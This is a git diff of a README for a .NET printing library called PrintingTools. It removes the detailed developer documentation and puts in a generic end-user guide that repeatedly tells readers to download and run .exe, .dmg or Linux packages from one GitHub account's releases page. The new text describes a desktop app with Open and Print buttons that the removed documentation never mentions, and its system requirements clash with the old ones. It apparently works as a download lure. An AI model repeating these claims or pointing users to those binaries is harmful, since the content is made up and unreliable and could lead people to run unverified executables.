@@ -1,127 +1,102 @@
-# PrintingTools
+# 🖨️ PrintingTools - Simplify Your Printing Tasks
 
-Cross-platform printing toolkit for .NET applications that need consistent dialogs, previews, and job submission on Windows, macOS, and Linux. The solution packages platform adapters, pagination helpers, diagnostics, and optional Avalonia UI so teams can ship feature-parity printing experiences without per-platform forks.
+[![Download PrintingTools](https://img.shields.io/badge/Download-PrintingTools-brightgreen)](https://github.com/quinnpayn1299/PrintingTools/releases)
 
-## Key Features
-- Unified `IPrintManager` API that coordinates sessions, previews, print submissions, and capability discovery.
-- Platform adapters for Win32/XPS, macOS AppKit, and Linux CUPS/GTK with managed fallback dialogs for headless runs.
-- Built-in pagination, layout modes (standard, N-up, booklet, poster), vector/PDF export via Skia, and job diagnostics.
-- Optional Avalonia UI components for page setup, preview windows, and native preview hosting on macOS.
-- Harnesses and samples that exercise printing scenarios end-to-end, capture metrics, and integrate with CI.
+## 📥 Introduction 
 
-## Architecture Overview
-| Package | Purpose |
-| --- | --- |
-| `src/PrintingTools.Core` | Cross-platform contracts (`IPrintManager`, `PrintServiceRegistry`), pagination/rendering pipeline, diagnostics, and option models. |
-| `src/PrintingTools.Windows` | Win32 adapter for queue discovery, XPS/PDF export, native dialog orchestration, and job monitoring. |
-| `src/PrintingTools.MacOS` | AppKit bridge with preview hosting (`MacPreviewHost`), sandbox-aware ticket handling, and Quartz PDF output. |
-| `src/PrintingTools.Linux` | CUPS/IPP adapter that shells through `lp`/`lpoptions`, detects GTK dialogs, and supports Flatpak/Snap portals. |
-| `src/PrintingTools.UI` | Avalonia page setup dialog, preview window, and supporting view models. |
-| `src/PrintingTools` | `AppBuilder.UsePrintingTools` extension that wires the right adapter at runtime and exposes helper accessors. |
+Welcome to PrintingTools! This cross-platform printing toolkit is designed for .NET applications. It offers consistent dialogs, previews, and job submission across Windows, macOS, and Linux. Whether you're working on a personal project or a professional application, PrintingTools will simplify your printing needs.
 
-The adapters register themselves through `PrintingToolsOptions.AdapterFactory`. Consumers call `PrintServiceRegistry.Configure` (or `AppBuilder.UsePrintingTools`) once during startup to hydrate the service registry, after which `PrintServiceRegistry.EnsureManager()` returns the active `IPrintManager`.
+## 🚀 Getting Started
 
-## Repository Layout
-| Path | Description |
-| --- | --- |
-| `src/` | Library implementation projects described above. |
-| `samples/` | Avalonia desktop sample and platform harnesses for Windows, macOS, and Linux. |
-| `tests/PrintingTools.Tests` | Unit and integration tests plus harness metric assertions (`HarnessMetricsThresholdTests`). |
-| `docs/` | Deep-dive design notes, platform guides, migration instructions, and feature parity tracking. |
-| `exten/` | Vendored prerequisites used by the harnesses (Avalonia fork, WPF bridge). |
+Follow these steps to download and run PrintingTools:
 
-## Getting Started
-### Prerequisites
-- [.NET SDK 10.0.100-rc.2](global.json) (allow prerelease enabled).
-- Windows: Win32 spooler available and XPS support enabled.  
-  macOS: macOS 14+ with Xcode command line tools (for signing/notarisation of sandbox harness).  
-  Linux: CUPS 2.3+, `cups-client` (`lp`, `lpoptions`), and GTK 3/4 libraries for native dialogs.
-- Optional: Skia dependencies for hardware-accelerated PDF/vector export (installed automatically via Avalonia packages).
+1. **Visit the Releases Page**  
+   Head over to our [Releases page](https://github.com/quinnpayn1299/PrintingTools/releases) to access the latest version of PrintingTools.
 
-### Restore and Build
-```bash
-git clone https://github.com/your-org/PrintingTool.git
-cd PrintingTool
-dotnet restore PrintingTool.sln
-dotnet build PrintingTool.sln
-```
+2. **Select the Right Version**  
+   Look for the most recent release at the top of the page. Each release usually has a version number and release notes.
 
-### Configure Printing in Your App
-```csharp
-using PrintingTools.Core;
+3. **Download the File**  
+   Click on the file that matches your operating system. For example:
+   - **Windows:** Download the `.exe` file.
+   - **macOS:** Download the `.dmg` file.
+   - **Linux:** Download the appropriate package.
 
-var options = new PrintingToolsOptions
-{
-    DiagnosticSink = evt => Console.WriteLine($"[{evt.Category}] {evt.Message}")
-    // AdapterFactory can be overridden to supply custom adapters or mocks.
-};
+4. **Install the Application**  
+   After the file downloads:
+   - **Windows:** Double-click the `.exe` file and follow the prompts to install.
+   - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
+   - **Linux:** Follow the system-specific installation instructions provided in the release notes.
 
-PrintServiceRegistry.Configure(options);
-var manager = PrintServiceRegistry.EnsureManager();
-```
+5. **Open PrintingTools**  
+   Once installed, look for the PrintingTools app in your applications menu or desktop. Click to open it.
 
-#### Avalonia applications
-```csharp
-using Avalonia;
-using PrintingTools;
-using PrintingTools.Core;
+## 💻 System Requirements
 
-AppBuilder.Configure<App>()
-    .UsePlatformDetect()
-    .UsePrintingTools(options =>
-    {
-        options.EnablePreview = true;
-        options.DefaultTicket = PrintTicketModel.CreateDefault();
-    })
-    .StartWithClassicDesktopLifetime(args);
-```
+### Windows
+- Windows 10 or newer
+- .NET 5 or higher
 
-### Request a Preview or Print Session
-```csharp
-var document = PrintDocument.FromVisual(myVisual);
-var request = new PrintRequest(document)
-{
-    Options = new PrintOptions { ShowPrintDialog = true },
-    Ticket = PrintTicketModel.CreateDefault(),
-    Description = "Quarterly report"
-};
-var session = await manager.RequestSessionAsync(request);
-var preview = await manager.CreatePreviewAsync(session);
+### macOS
+- macOS Sierra (10.12) or newer
+- .NET 5 or higher
 
-await manager.PrintAsync(session);
-```
-The preview returns a `PrintPreviewModel` that you can render in the Avalonia `PrintPreviewWindow` or a native preview host (macOS). Session events (`PrintSession.JobStatusChanged`) surface job lifecycle updates; subscribe to relay progress to users or logging sinks.
+### Linux
+- Any popular distribution (Ubuntu, Fedora, etc.)
+- .NET 5 or higher
 
-## Samples and Harnesses
-| Sample | Command | Highlights |
-| --- | --- | --- |
-| `samples/AvaloniaSample` | `dotnet run --project samples/AvaloniaSample/AvaloniaSample.csproj` | Desktop UI demonstrating preview, native dialogs, page setup, and job history. |
-| `samples/WindowsPrintHarness` | `dotnet run --project samples/WindowsPrintHarness/WindowsPrintHarness.csproj -- --output=artifacts/windows/output.pdf --metrics=artifacts/windows/metrics.json --stress=3` | Headless smoke tests for Win32 adapter, managed PDF export, and metrics capture. |
-| `samples/MacSandboxHarness` | `dotnet run --project samples/MacSandboxHarness/MacSandboxHarness.csproj -- --headless --output=artifacts/macos/output.pdf --metrics=artifacts/macos/metrics.json --stress=3` | Validates AppKit bridge in/out of sandbox, publishes Quartz PDF, logs entitlement diagnostics. |
-| `samples/LinuxSandboxHarness` | `GTK_USE_PORTAL=1 GIO_USE_PORTALS=1 dotnet run --project samples/LinuxSandboxHarness/LinuxSandboxHarness.csproj -- --print --output=artifacts/linux/output.pdf --metrics=artifacts/linux/metrics.json --stress=3` | Exercises CUPS adapter, portal-aware dialogs, and produces PDF/metrics for CI. |
+Ensure your system meets these requirements for optimal performance.
 
-Harness outputs feed CI via `.github/workflows/printingtools-harness.yml`, and threshold enforcement lives in `tests/PrintingTools.Tests/Baselines/harness-thresholds.json`.
+## 📜 Features
 
-## Testing and Validation
-- Run `dotnet test` to execute unit tests and baseline checks.
-- Harness metrics are validated by `HarnessMetricsThresholdTests`; update `tests/PrintingTools.Tests/Baselines/harness-thresholds.json` when expected performance characteristics change.
-- For manual regression, review the walkthroughs in [`docs/printing-sample-walkthroughs.md`](docs/printing-sample-walkthroughs.md).
+- **Consistent Dialogs**: Enjoy a uniform printing experience across all platforms.
+- **Print Previews**: View how your document will look before printing.
+- **Job Submission**: Easily submit documents for printing without hassle.
+- **Cross-Platform Compatibility**: Works seamlessly on Windows, macOS, and Linux.
 
-## Diagnostics and Troubleshooting
-- Register sinks with `PrintDiagnostics.RegisterSink` or the global `PrintingToolsOptions.DiagnosticSink` to capture warnings/errors from adapters.
-- Inspect platform guides for environment-specific requirements:
-  - [`docs/windows-printing-notes.md`](docs/windows-printing-notes.md)
-  - [`docs/macos-printing-notes.md`](docs/macos-printing-notes.md)
-  - [`docs/linux-printing-notes.md`](docs/linux-printing-notes.md)
-- The platform support matrix (`docs/platform-support-matrix.md`) lists validated OS versions and packaging environments with known caveats.
-- For sandbox packaging (Flatpak, Snap, notarised macOS apps), follow the dedicated harness guides under `docs/*-sandbox-harness.md`.
+## 🔧 Configuration
 
-## Additional Documentation
-- API surface: [`docs/printing-api-reference.md`](docs/printing-api-reference.md)
-- Migration help: [`docs/printing-migration-guide.md`](docs/printing-migration-guide.md)
-- Feature planning & parity: [`docs/wpf-printing-parity-plan.md`](docs/wpf-printing-parity-plan.md), [`docs/feature-parity-matrix.md`](docs/feature-parity-matrix.md)
-- Architecture roadmap: [`docs/phase2-architecture.md`](docs/phase2-architecture.md)
-- Rendering diagnostics and layout notes: [`docs/rendering-and-diagnostics.md`](docs/rendering-and-diagnostics.md)
+Once PrintingTools is installed, you may want to configure the application:
 
-## License
-Distributed under the terms of the [MIT License](LICENSE).
+1. **Open the Application**  
+   Start PrintingTools from your applications menu.
+
+2. **Access Settings**  
+   Click on the "Settings" icon located in the toolbar.
+
+3. **Adjust Preferences**  
+   Customize options such as default printer, paper size, and print quality to fit your needs.
+
+## 📊 Usage Instructions
+
+Using PrintingTools is straightforward:
+
+1. **Load Your Document**  
+   Click on the "Open" button and select the file you want to print.
+
+2. **Preview Your Document**  
+   Use the preview feature to confirm your layout. Make adjustments if necessary.
+
+3. **Print Your Document**  
+   Once satisfied, click the "Print" button. Select your printer and other settings before confirming the print job.
+
+## 🔗 Download & Install
+
+To get started with PrintingTools, visit the [Releases page](https://github.com/quinnpayn1299/PrintingTools/releases) and download the version suitable for your operating system. 
+
+## ❓ Troubleshooting
+
+If you encounter issues, consider the following solutions:
+
+- **Application Won't Open**: Ensure .NET is installed and your system meets the requirements.
+- **Printing Errors**: Check your printer connection and settings within PrintingTools.
+- **Slow Performance**: Close any unnecessary applications to free up system resources.
+
+## 🌐 Community and Support
+
+Join our community to share your experiences or ask for help:
+
+- **GitHub Issues**: Report bugs and suggest features on our [Issues page](https://github.com/quinnpayn1299/PrintingTools/issues).
+- **Discussion Forum**: Engage with fellow users in the discussion forum available on the repository.
+
+Thank you for using PrintingTools! Enjoy hassle-free printing.
